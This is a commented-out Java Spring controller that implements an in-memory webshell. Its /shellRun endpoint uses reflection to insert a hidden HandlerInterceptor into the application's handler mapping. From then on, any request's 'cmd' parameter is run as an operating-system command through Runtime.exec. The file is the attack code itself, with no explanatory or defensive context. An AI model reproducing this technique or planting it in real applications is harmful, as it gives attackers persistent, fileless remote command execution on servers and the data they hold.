//package com.example.spring;
//
//import org.springframework.stereotype.Controller;
//import org.springframework.web.bind.annotation.RequestMapping;
//import org.springframework.web.bind.annotation.ResponseBody;
//import org.springframework.web.context.WebApplicationContext;
//import org.springframework.web.context.request.RequestContextHolder;
//import org.springframework.web.servlet.HandlerInterceptor;
//import org.springframework.web.servlet.handler.AbstractHandlerMapping;
//import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
//
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.lang.reflect.Field;
//import java.util.ArrayList;
//
//@Controller
//public class InterceptorClassController {
//
//    @ResponseBody
//    @RequestMapping("/shellRun")
//    public void Inject() throws NoSuchFieldException, IllegalAccessException {
//        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.ROOT", 0);
//        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);
//        Field field = abstractHandlerMapping.getClass().getDeclaredField("adaptedInterceptors");
//        field.setAccessible(true);
//        ArrayList adaptedInterceptors = (ArrayList) field.get(abstractHandlerMapping);
//        adaptedInterceptors.add(new interceptClass());
//        System.out.println("Success !!!");
//
//    }
//
//    public class interceptClass implements HandlerInterceptor {
//
//        @Override
//        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
//            String input = request.getParameter("cmd");
//            if (input != null) {
//                Runtime.getRuntime().exec(input);
//                return true;
//            }
//           return false;
//        }
//    }
//
//}
//
//
